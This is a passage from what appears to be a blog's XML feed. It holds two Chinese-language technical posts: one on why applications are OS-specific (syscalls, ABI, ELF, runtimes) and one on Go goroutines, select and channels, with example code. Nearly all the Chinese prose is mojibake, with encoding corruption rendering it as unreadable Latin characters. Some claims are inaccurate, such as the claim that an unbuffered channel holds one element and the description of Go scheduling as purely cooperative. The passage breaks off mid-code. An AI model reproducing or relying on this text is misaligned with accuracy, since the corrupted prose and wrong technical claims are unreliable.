ç”¨çš„å¯„å­˜å™¨</li></ul><hr><p>å›åˆ°ä¹‹å‰çš„é—®é¢˜ï¼Œå¦‚æœç¨‹åºæ±‡ç¼–ä»£ç ä¸­æœ‰å¦‚ä¸‹çš„ syscallï¼ˆx86 ä¸ºä¾‹ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 57  // set the system call number</span><br><span class="line">syscall      // transfer control</span><br></pre></td></tr></table></figure><ol><li>ä¸åŒçš„æ“ä½œç³»ç»Ÿå¯èƒ½è¯»å–ä¸åŒçš„å¯„å­˜å™¨æ¥è·å–ç³»ç»Ÿè°ƒç”¨åºå·ï¼Œæ‰€ä»¥å¦‚æœè¯»å–çš„æ˜¯<code>%rbx</code>ï¼Œé‚£ä¹ˆç›´æ¥ç³»ç»Ÿå°± crash äº†ã€‚</li><li>å°±ç®—æ˜¯è¯»å–åŒä¸€å¯„å­˜å™¨ï¼Œä½†å¯¹äºåŒä¸€åºå·å¯èƒ½å®ç°çš„æ˜¯ä¸åŒçš„ syscallã€‚<br><img src="/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/win.png" alt="windows.png"><br><img src="/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/linux.png" alt="linux.png"></li></ol><h1 id="2-å‚æ•°ä¼ é€’ä¸-abi"><a class="markdownIt-Anchor" href="#2-å‚æ•°ä¼ é€’ä¸-abi"></a> 2. å‚æ•°ä¼ é€’ä¸ ABI</h1><p>å¤§éƒ¨åˆ†ç³»ç»Ÿè°ƒç”¨éƒ½éœ€è¦ä¼ é€’å‚æ•°ï¼Œé‚£ä¹ˆå°†å‚æ•°å†™åˆ°ä»€ä¹ˆåœ°æ–¹ä¹Ÿä¼šäº§ç”Ÿé—®é¢˜ï¼š<code>OS1</code>å¯èƒ½è¯»å–çš„æ˜¯å¯„å­˜å™¨ä¸Šçš„å‚æ•°å€¼ï¼Œè€Œ<code>OS2</code>å¯èƒ½è¯»å–çš„æ˜¯å†…å­˜ä¸Šçš„å‚æ•°å€¼ã€‚é€šè¿‡å†…å­˜ä¼ é€’å‚æ•°åˆåˆ†ä¸ºé€šè¿‡æ ˆæˆ–è€…ä¸€å—ç‰¹å®šçš„å†…å­˜ç©ºé—´ã€‚è¿™å°±æ˜¯åº•å±‚ ABI ä¹‹é—´çš„å·®å¼‚é€ æˆçš„ä¸å…¼å®¹ã€‚</p><hr><h2 id="application-binary-interface-abi"><a class="markdownIt-Anchor" href="#application-binary-interface-abi"></a> Application Binary Interface (ABI)</h2><p>ç±»æ¯” API æ˜¯æˆ‘ä»¬å¦‚ä½•åœ¨è¯­è¨€å±‚é¢è°ƒç”¨å‡½æ•°ï¼ŒABI åˆ™æ˜¯åœ¨æ±‡ç¼–/äºŒè¿›åˆ¶ç å±‚é¢å…·ä½“æ˜¯å¦‚ä½•è°ƒç”¨çš„ã€‚</p><blockquote><p><strong>ABI = binary-level contract</strong> that defines how functions, data, and system calls are represented and interacted with at runtime.</p></blockquote><p>é™¤äº†å‰è¿°çš„å‚æ•°ä¼ é€’çš„è§„å®šï¼ŒABI è¿˜åŒ…æ‹¬ï¼š</p><ul><li><strong>Register usage</strong>: registers are caller-saved vs callee-saved</li><li><strong>Binary format</strong>: Format of executable files (like ELF on Linux, PE on Windows)</li><li><strong>System call interface</strong>: How system calls are made (via <code>syscall</code>, <code>int 0x80</code>, etc.)</li><li><strong>Exception handling</strong>: How exceptions are represented and handled in binary</li></ul><p>å…·ä½“ä¸¾ x86-64 System V ABI (Linux) ä¸ºä¾‹ï¼š</p><ul><li>å‰å…­ä¸ªå‚æ•°çš„å€¼è®¾ç½®åœ¨: <code>RDI, RSI, RDX, RCX, R8, R9</code></li><li>è¿”å›å€¼è®¾ç½®: <code>RAX</code></li><li>åœ¨ <code>call</code>ä¹‹å‰æ ˆå¿…é¡»ä»¥ 16 å­—èŠ‚å¯¹é½</li><li>Caller-saved: <code>RAX, RCX, RDX, RSI, RDI, R8â€“R11</code></li><li>Callee-saved: <code>RBX, RBP, R12â€“R15</code></li></ul><hr><h1 id="3-å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼"><a class="markdownIt-Anchor" href="#3-å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼"></a> 3. å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼</h1><p>ä¸åŒæ“ä½œç³»ç»Ÿçš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ä¸åŒï¼Œå…¶ä¸­åŒ…å«äº†æè¿°è¯¥æ–‡ä»¶çš„ meta-data å’Œå…·ä½“æ–‡ä»¶æ•°æ®ã€‚</p><p>ä»¥ ELF ä¸ºä¾‹ï¼š<img src="/2025/04/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E7%89%B9%E5%AE%9A%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84/elf.png" alt="elf.png"><br>æ–‡ä»¶ä¸­çš„ä¸åŒ section å…·æœ‰ä¸åŒçš„ç”¨é€”ï¼Œ<code>.debug</code>ç”¨äºè°ƒè¯•ï¼Œ<code>.symtab</code>ç”¨äºé“¾æ¥ï¼Œ<code>.data</code>å’Œ<code>.bss</code>ç”¨äºåˆå§‹åŒ–/æœªåˆå§‹åŒ–æ•°æ®çš„è¯»å†™</p><h1 id="4-è¿è¡Œæ—¶ç¯å¢ƒ-runtime"><a class="markdownIt-Anchor" href="#4-è¿è¡Œæ—¶ç¯å¢ƒ-runtime"></a> 4. è¿è¡Œæ—¶ç¯å¢ƒ runtime</h1><p>Java è¿è¡Œåœ¨ JVM ä¸Šï¼ŒPython ä»£ç é€šè¿‡è§£é‡Šå™¨è§£é‡Šæ‰§è¡Œï¼ŒJS ä¹Ÿä¼šè¢«æµè§ˆå™¨çš„ Javascript å¼•æ“è§£é‡Šæ‰§è¡Œï¼Œé€šè¿‡è™šæ‹ŸåŒ–å¯ä»¥å¾ˆå¥½åœ°é¿å…ä¸Šè¿°é—®é¢˜ã€‚ä½†ç°ä»£ç¨‹åºéƒ½æ˜¯æ¨¡å—åŒ–çš„ï¼Œå¦‚æœç‰¹å®šæ¨¡å—æ‰€éœ€è¦çš„ç¯å¢ƒåœ¨å¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿä¸Šå¹¶æ²¡æœ‰æä¾›ï¼Œé‚£ä¹ˆæ•´ä¸ªç¨‹åºéƒ½æ— æ³•è¿è¡Œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;çœ‹è§†é¢‘çœ‹åˆ°äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼š&lt;a href=&quot;https://www.youtube.com/watch?v=eP_P4KOjwhs&quot;&gt;Why applications are operating-system specific?&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;è§‚ç‚¹çœ‹</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Goåç¨‹ä¸é€šé“æœºåˆ¶</title>
    <link href="http://example.com/2025/04/07/Go%E5%8D%8F%E7%A8%8B%E4%B8%8E%E9%80%9A%E9%81%93%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2025/04/07/Go%E5%8D%8F%E7%A8%8B%E4%B8%8E%E9%80%9A%E9%81%93%E6%9C%BA%E5%88%B6/</id>
    <published>2025-04-07T06:12:17.966Z</published>
    <updated>2025-04-10T06:47:15.772Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Donâ€™t communicateÂ byÂ sharing memory; share memory by communicating.</p></blockquote><h1 id="goroutine"><a class="markdownIt-Anchor" href="#goroutine"></a> Goroutine</h1><h2 id="goroutine-ä¸-thread"><a class="markdownIt-Anchor" href="#goroutine-ä¸-thread"></a> goroutine ä¸ thread</h2><p>åœ¨ Go ä¸­ï¼Œåº”ç”¨ç¨‹åºå¹¶å‘å¤„ç†çš„éƒ¨åˆ†è¢«ç§°ä½œ <code>goroutines</code>ï¼Œå®ƒå¯ä»¥è¿›è¡Œæ›´æœ‰æ•ˆçš„å¹¶å‘è¿ç®—ã€‚åç¨‹ç”± Go è¿è¡Œæ—¶ (runtime) åˆ›å»ºï¼Œå’Œæ“ä½œç³»ç»Ÿçº¿ç¨‹ä¹‹é—´å¹¶æ— ä¸€å¯¹ä¸€çš„å…³ç³»ï¼ˆuser-kernel thread æ˜ å°„æ¨¡å‹ï¼‰ï¼šåç¨‹æ˜¯æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹çš„å¯ç”¨æ€§ï¼Œæ˜ å°„ï¼ˆå¤šè·¯å¤ç”¨ï¼‰åœ¨ä»–ä»¬ä¹‹ä¸Šçš„ã€‚</p><p>åç¨‹è°ƒåº¦å™¨åœ¨<strong>ç”¨æˆ·æ€ä¸Š</strong>å¯¹ goroutines è¿›è¡Œç®¡ç†ï¼Œé‡‡ç”¨ M:N è°ƒåº¦æ¨¡å‹ï¼ˆM ä¸ª Goroutine æ˜ å°„åˆ° N ä¸ªçº¿ç¨‹ï¼‰ï¼Œå¯ä»¥ç”¨<code>GOMAXPROCS</code>ï¼ˆé€»è¾‘å¤„ç†å™¨æ•°é‡ï¼‰æ¥æ§åˆ¶ N çš„æ•°é‡ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œçº¿ç¨‹æ˜¯ç”±æ“ä½œç³»ç»Ÿå†…æ ¸è¿›è¡Œç®¡ç†å’Œè°ƒåº¦çš„ï¼Œè¢«æ“ä½œç³»ç»Ÿè°ƒåº¦å™¨åˆ†é…åˆ°ä¸åŒçš„å¤„ç†å™¨æ ¸å¿ƒä¸Šè¿è¡Œã€‚ç”±äºæ²¡æœ‰å†…æ ¸çš„ä»‹å…¥ï¼Œåç¨‹çš„åˆ›å»ºä¸åˆ‡æ¢çš„å¼€é”€é™ä½å¾ˆå¤šã€‚å…·ä½“æ¥è¯´ï¼ŒGo é‡‡ç”¨<strong>åä½œå¼è°ƒåº¦</strong>ï¼ˆé€šè¿‡ Â <code>Gosched()</code>Â  æˆ– <code>channel</code>é˜»å¡ä¸»åŠ¨è®©å‡º CPU ï¼‰ï¼Œè€Œçº¿ç¨‹åˆ™æ˜¯ç”± OS è¿›è¡Œ<strong>æŠ¢å å¼è°ƒåº¦</strong>ï¼ˆRR, FCFS, â€¦ï¼‰ã€‚</p><p><img src="/2025/04/07/Go%E5%8D%8F%E7%A8%8B%E4%B8%8E%E9%80%9A%E9%81%93%E6%9C%BA%E5%88%B6/gorountine%E8%B0%83%E5%BA%A6.png" alt="gorountineè°ƒåº¦"></p><p>æ‘˜é€‰<a href="https://zhuanlan.zhihu.com/p/662344603">çŸ¥ä¹çš„ä¸€ä¸ªä¾‹å­</a>ï¼Œç”ŸåŠ¨è§£é‡Šäº† Goroutineã€coroutine å’Œ thread ä¹‹é—´çš„è”ç³»ï¼š</p><blockquote><p><strong>Thread</strong>ï¼šæƒ³è±¡çº¿ç¨‹å°±åƒæ˜¯å…¬å¸çš„å‘˜å·¥ã€‚æ¯ä¸ªå‘˜å·¥éƒ½æœ‰è‡ªå·±çš„ä»»åŠ¡å’Œè´£ä»»ï¼Œä½†ä»–ä»¬å…±äº«å…¬å¸çš„èµ„æºï¼ˆä¾‹å¦‚åŠå…¬å®¤ã€æ‰“å°æœºç­‰ï¼‰ã€‚å‘˜å·¥ï¼ˆçº¿ç¨‹ï¼‰çš„ä¸Šä¸‹ç­ï¼ˆå¼€å§‹å’Œç»“æŸçº¿ç¨‹ï¼‰ä»¥åŠå·¥ä½œè°ƒåº¦ï¼ˆçº¿ç¨‹åˆ‡æ¢ï¼‰ç”±å…¬å¸ç®¡ç†å±‚ï¼ˆæ“ä½œç³»ç»Ÿï¼‰æ§åˆ¶ã€‚å¦‚æœå…¬å¸è¦æ–°å¢ä¸€ä¸ªå‘˜å·¥æˆ–è€…å®‰æ’å‘˜å·¥ä¹‹é—´çš„å·¥ä½œï¼Œè¿™éœ€è¦ç®¡ç†å±‚çš„ç›´æ¥å‚ä¸ï¼Œä¹Ÿä¼šæ¶‰åŠåˆ°è¾ƒå¤šçš„äººåŠ›å’Œç‰©åŠ›èµ„æºï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œçº¿ç¨‹çš„åˆ›å»ºå’Œä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬ç›¸å¯¹è¾ƒé«˜ï¼‰ã€‚</p><p><strong>Coroutine</strong>ï¼šç°åœ¨æƒ³è±¡åç¨‹å°±åƒæ˜¯åœ¨å®¶å·¥ä½œçš„è‡ªç”±èŒä¸šè€…ã€‚ä»–ä»¬ä½¿ç”¨è‡ªå·±çš„ç”µè„‘å’ŒåŠå…¬è®¾å¤‡ï¼ˆæ‹¥æœ‰è‡ªå·±çš„å †æ ˆå’Œå±€éƒ¨å˜é‡ï¼‰ï¼Œå¹¶ä¸”è‡ªå·±å†³å®šä»€ä¹ˆæ—¶å€™å·¥ä½œã€ä»€ä¹ˆæ—¶å€™ä¼‘æ¯ï¼ˆç¼–ç¨‹è€…æ§åˆ¶ï¼‰ã€‚ä»–ä»¬å¯ä»¥éšæ—¶æš‚åœå·¥ä½œå»å–æ¯å’–å•¡æˆ–æ˜¯æ•£æ­¥ï¼ˆyield æˆ–ç­‰å¾…ï¼‰ï¼Œç„¶åå†å›æ¥ç»§ç»­å·¥ä½œã€‚æ‰€æœ‰è¿™äº›æ´»åŠ¨çš„å®‰æ’éƒ½ä¸éœ€è¦å¤–éƒ¨ç®¡ç†å±‚çš„å‚ä¸ï¼ˆç”¨æˆ·çº§çš„è°ƒåº¦ï¼‰ï¼Œå¹¶ä¸”å‡ ä¹ä¸éœ€è¦é¢å¤–çš„èµ„æºï¼ˆä½æˆæœ¬çš„ä»»åŠ¡åˆ‡æ¢ï¼‰ã€‚</p><p><strong>Goroutine</strong>ï¼šGoroutine å°±åƒæ˜¯ä½¿ç”¨ç‰¹æ®Šå·¥ä½œæ–¹æ³•çš„è‡ªç”±èŒä¸šè€…å›¢é˜Ÿã€‚ä»–ä»¬ä¸ä»…å¯ä»¥è‡ªå·±å®‰æ’å·¥ä½œæ—¶é—´ï¼ˆ<a href="https://zhida.zhihu.com/search?content_id=235316306&amp;content_type=Article&amp;match_order=1&amp;q=%E7%94%A8%E6%88%B7%E6%80%81&amp;zhida_source=entity">ç”¨æˆ·æ€</a>è°ƒåº¦ï¼‰ï¼Œè¿˜ä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„é€šä¿¡æ–¹å¼ â€”â€” ä»–ä»¬ä¸ä¼šç›´æ¥äº¤è°ˆï¼ˆå…±äº«å†…å­˜ï¼‰ï¼Œè€Œæ˜¯é€šè¿‡å†™ä¿¡ï¼ˆä¼ é€’æ¶ˆæ¯ï¼‰æ¥æ²Ÿé€šï¼ˆchannel æœºåˆ¶ï¼‰ã€‚è¿™ç§å·¥ä½œæ–¹å¼ä½¿ä»–ä»¬çš„åˆä½œæ›´åŠ é«˜æ•ˆå’Œæœ‰åºï¼ˆå¹¶å‘ç¼–ç¨‹æ›´å®¹æ˜“å®ç°å’Œç®¡ç†ï¼‰ã€‚</p></blockquote><p><a href="https://studygolang.com/articles/29227?fr=sidebar">GoLang GPM æ¨¡å‹ - Go è¯­è¨€ä¸­æ–‡ç½‘ - Golang ä¸­æ–‡ç¤¾åŒº</a>ä»‹ç»äº† Go runtime GPM è°ƒåº¦æ¨¡å‹ï¼Œå…¶ä¸­å¾ˆæ¸…æ™°çš„è§£é‡Šäº†çº¿ç¨‹æ¨¡å‹ ğŸ‘</p><h2 id="select"><a class="markdownIt-Anchor" href="#select"></a> select</h2><p>åœ¨ Go é‡Œï¼Œ<code>select</code>è¯­å¥ä¸»è¦ç”¨äºåœ¨å¤šä¸ªé€šé“æ“ä½œé—´è¿›è¡Œé€‰æ‹©ã€‚å®ƒå’Œ<code>switch</code>è¯­å¥ç±»ä¼¼ï¼Œä¸è¿‡<code>switch</code>ç”¨äºé€‰æ‹©ä¸åŒçš„æ¡ä»¶åˆ†æ”¯ï¼Œè€Œ<code>select</code>ç”¨äºé€‰æ‹©ä¸åŒçš„é€šé“æ“ä½œã€‚<code>select</code>ä¼šé˜»å¡ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªé€šé“æ“ä½œå‡†å¤‡å¥½ï¼Œè‹¥æœ‰å¤šä¸ªæ“ä½œåŒæ—¶å°±ç»ªï¼Œä¼šéšæœºé€‰æ‹©ä¸€ä¸ªæ‰§è¡Œã€‚è¦æ˜¯å­˜åœ¨<code>default</code>åˆ†æ”¯ï¼Œåœ¨æ²¡æœ‰é€šé“æ“ä½œå‡†å¤‡å¥½æ—¶ï¼Œä¼šæ‰§è¡Œ<code>default</code>åˆ†æ”¯ï¼Œä»è€Œé¿å…é˜»å¡ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¤ºä¾‹ï¼šå®ç°è¶…æ—¶æ§åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">        ch1 &lt;- <span class="string">&quot;data from channel 1&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">        ch2 &lt;- <span class="string">&quot;data from channel 2&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> msg1 := &lt;-ch1:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Received&quot;</span>, msg1)</span><br><span class="line">    <span class="keyword">case</span> msg2 := &lt;-ch2:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Received&quot;</span>, msg2)</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(<span class="number">3</span> * time.Second):</span><br><span class="line">        fmt.Println(<span class="string">&quot;Timeout&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>select</code>æœºåˆ¶æ˜¯ Go è¯­è¨€å¹¶å‘ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼Œå®ƒä¸ºå¤„ç†å¤šä¸ªé€šé“çš„å¹¶å‘æ“ä½œæä¾›äº†ä¸€ç§ç®€æ´ã€é«˜æ•ˆä¸”çµæ´»çš„æ–¹å¼ï¼Œä½¿å¾— Go è¯­è¨€åœ¨å¤„ç†å¤æ‚çš„å¹¶å‘åœºæ™¯æ—¶èƒ½å¤Ÿæ›´åŠ ä¼˜é›…å’Œæ˜“äºç»´æŠ¤ã€‚</p><ul><li><strong>å®ç°å¹¶å‘æ“ä½œçš„å¤šè·¯å¤ç”¨</strong>ï¼šåœ¨å¹¶å‘ç¼–ç¨‹ä¸­ï¼Œç»å¸¸éœ€è¦åŒæ—¶å¤„ç†å¤šä¸ªé€šé“çš„æ“ä½œã€‚<code>select</code>å…è®¸ç¨‹åºåœ¨å¤šä¸ªé€šé“ä¹‹é—´è¿›è¡Œé€‰æ‹©ï¼Œå½“å…¶ä¸­ä»»ä½•ä¸€ä¸ªé€šé“å‡†å¤‡å¥½è¿›è¡Œè¯»å–æˆ–å†™å…¥æ“ä½œæ—¶ï¼Œå°±å¯ä»¥æ‰§è¡Œç›¸åº”çš„åˆ†æ”¯é€»è¾‘ã€‚è¿™ä½¿å¾—ç¨‹åºèƒ½å¤Ÿé«˜æ•ˆåœ°å¤„ç†å¤šä¸ªå¹¶å‘ä»»åŠ¡ï¼Œé¿å…äº†é€ä¸ªæ£€æŸ¥é€šé“çŠ¶æ€çš„ç¹çæ“ä½œï¼Œæé«˜äº†ä»£ç çš„ç®€æ´æ€§å’Œå¯è¯»æ€§ã€‚</li><li><strong>å¤„ç†å¼‚æ­¥äº‹ä»¶</strong>ï¼šåœ¨å¼‚æ­¥ç¼–ç¨‹æ¨¡å‹ä¸­ï¼Œå„ä¸ªæ“ä½œå¯èƒ½åœ¨ä¸åŒçš„æ—¶é—´ç‚¹å®Œæˆï¼Œ<code>select</code>å¯ä»¥ç”¨äºç›‘å¬å¤šä¸ªå¼‚æ­¥æ“ä½œçš„å®Œæˆä¿¡å·ã€‚ä¾‹å¦‚ï¼Œåœ¨ç½‘ç»œç¼–ç¨‹ä¸­ï¼Œå¯èƒ½åŒæ—¶æœ‰å¤šä¸ªç½‘ç»œè¿æ¥åœ¨è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œé€šè¿‡<code>select</code>å¯ä»¥éšæ—¶å“åº”å“ªä¸ªè¿æ¥æœ‰æ•°æ®å¯è¯»æˆ–å¯å†™ï¼Œä»è€Œå®ç°å¯¹å¤šä¸ªç½‘ç»œè¿æ¥çš„é«˜æ•ˆç®¡ç†ã€‚</li></ul><h1 id="channel"><a class="markdownIt-Anchor" href="#channel"></a> Channel</h1><h2 id="æ— ç¼“å†²åŒæ­¥ä¸æœ‰ç¼“å†²å¼‚æ­¥çš„æ•°æ®ä¼ é€’"><a class="markdownIt-Anchor" href="#æ— ç¼“å†²åŒæ­¥ä¸æœ‰ç¼“å†²å¼‚æ­¥çš„æ•°æ®ä¼ é€’"></a> æ— ç¼“å†²åŒæ­¥ä¸æœ‰ç¼“å†²å¼‚æ­¥çš„æ•°æ®ä¼ é€’</h2><p>ä¸€èˆ¬æˆ‘ä»¬é€šè¿‡<code>ch := make(chan type)</code>åˆ›å»ºçš„æ˜¯æ— ç¼“å†²ä¸”åŒæ­¥çš„é€šé“ï¼Œåªæœ‰å½“æ¥æ”¶æ–¹å‡†å¤‡å¥½åå‘é€æ–¹æ‰ä¼šå‘é€æ•°æ®ï¼Œå› æ­¤é€šé“çš„å‘é€ / æ¥æ”¶æ“ä½œåœ¨å¯¹æ–¹å‡†å¤‡å¥½ä¹‹å‰æ˜¯é˜»å¡çš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é˜»å¡ç¤ºä¾‹</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">print</span><span class="params">(ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Print(&lt;-ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">ch &lt;- <span class="number">2</span>       <span class="comment">// mainçº¿ç¨‹åœ¨æ­¤è¢«é˜»å¡ï¼Œäº§ç”Ÿdeadlockï¼ŒæŠ›å‡ºpanic</span></span><br><span class="line"><span class="keyword">go</span> <span class="built_in">print</span>(ch)  <span class="comment">// ä¸ä¼šæ‰§è¡Œè¿™æ¡è¯­å¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ— ç¼“å†²é€šé“åªèƒ½åŒ…å« 1 ä¸ªå…ƒç´ ï¼Œé€šè¿‡<code>ch := make(chan type, buf)</code>å¯ä»¥è®¾ç½®é€šé“ç¼“å­˜å¤§å°ã€‚åœ¨ç¼“å†²åŒºæ»¡è½½ä¹‹å‰ï¼Œç»™ä¸€ä¸ªå¸¦ç¼“å†²çš„é€šé“å‘é€æ•°æ®æ˜¯ä¸ä¼šé˜»å¡çš„ï¼Œè€Œä»é€šé“è¯»å–æ•°æ®ä¹Ÿä¸ä¼šé˜»å¡ï¼Œç›´åˆ°ç¼“å†²åŒºç©ºäº†ã€‚</p><p>å¦‚æœå®¹é‡å¤§äº 0ï¼Œé€šé“å°±æ˜¯å¼‚æ­¥çš„äº†ï¼šç¼“å†²æ»¡è½½ï¼ˆå‘é€ï¼‰æˆ–å˜ç©ºï¼ˆæ¥æ”¶ï¼‰ä¹‹å‰é€šä¿¡ä¸ä¼šé˜»å¡ï¼Œå…ƒç´ ä¼šæŒ‰ç…§å‘é€çš„é¡ºåºè¢«æ¥æ”¶ï¼Œæ­¤æ—¶ä¸Šé¢çš„ç¤ºä¾‹å¯ä»¥è¿è¡Œã€‚å¦‚æœå®¹é‡æ˜¯ 0 æˆ–è€…æœªè®¾ç½®ï¼Œé€šä¿¡ä»…åœ¨æ”¶å‘åŒæ–¹å‡†å¤‡å¥½çš„æƒ…å†µä¸‹æ‰å¯ä»¥æˆåŠŸã€‚</p><h2 id="åº•å±‚æ•°æ®ä¼ é€’åŸç†"><a class="markdownIt-Anchor" href="#åº•å±‚æ•°æ®ä¼ é€’åŸç†"></a> åº•å±‚æ•°æ®ä¼ é€’åŸç†</h2><ul><li><strong>æ•°æ®å¤åˆ¶</strong>ï¼šå½“ä¸€ä¸ª Â <code>goroutine</code>Â  å‘é€šé“å‘é€æ•°æ®æ—¶ï¼Œæ•°æ®ä¼šè¢«å¤åˆ¶åˆ°é€šé“å†…éƒ¨ã€‚åœ¨æ— ç¼“å†²é€šé“ä¸­ï¼Œè¿™ä¸ªå¤åˆ¶æ“ä½œæ˜¯åœ¨æ¥æ”¶è€…å‡†å¤‡å¥½æ¥æ”¶æ•°æ®æ—¶æ‰ä¼šå‘ç”Ÿã€‚</li><li><strong>åŒæ­¥æœºåˆ¶</strong>ï¼šé€šé“ä½¿ç”¨äº†äº’æ–¥é”ï¼ˆmutexï¼‰å’Œæ¡ä»¶å˜é‡ï¼ˆcondition variableï¼‰æ¥å®ç°åŒæ­¥ã€‚å½“å‘é€è€…å°è¯•å‘é€æ•°æ®æ—¶ï¼Œå®ƒä¼šå…ˆè·å–é€šé“çš„é”<code>mutex_lock()</code>ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰æ¥æ”¶è€…å‡†å¤‡å¥½æ¥æ”¶æ•°æ®ã€‚å¦‚æœæ²¡æœ‰ï¼Œå‘é€è€…ä¼šé‡Šæ”¾é”<code>mutex_unlock()</code>å¹¶è¿›å…¥é˜»å¡çŠ¶æ€ï¼›å½“æ¥æ”¶è€…å‡†å¤‡å¥½æ¥æ”¶æ•°æ®æ—¶ï¼Œå®ƒä¼šè·å–é”ï¼Œé€šçŸ¥å‘é€è€…å¯ä»¥å‘é€æ•°æ®<code>signal()</code>ï¼Œç„¶åè¿›è¡Œæ•°æ®çš„å¤åˆ¶å’Œæ¥æ”¶æ“ä½œã€‚</li></ul><h2 id="å…³é—­é€šé“ä¸æµ‹è¯•é˜»å¡"><a class="markdownIt-Anchor" href="#å…³é—­é€šé“ä¸æµ‹è¯•é˜»å¡"></a> å…³é—­é€šé“ä¸æµ‹è¯•é˜»å¡</h2><p>é€šé“å¯ä»¥è¢«æ˜¾å¼çš„å…³é—­<code>close(chan)</code>ï¼Œåªæœ‰åœ¨å½“éœ€è¦å‘Šè¯‰æ¥æ”¶è€…ä¸ä¼šå†æä¾›æ–°çš„å€¼çš„æ—¶å€™ï¼Œæ‰éœ€è¦å…³é—­é€šé“ï¼Œå› æ­¤åªæœ‰å‘é€è€…æ‰ä¼šæœ‰å…³é—­é€šé“çš„éœ€è¦ã€‚ç»™å·²ç»å…³é—­çš„é€šé“å‘é€æˆ–è€…å†æ¬¡å…³é—­éƒ½ä¼šå¯¼è‡´è¿è¡Œæ—¶ panicã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(ch)   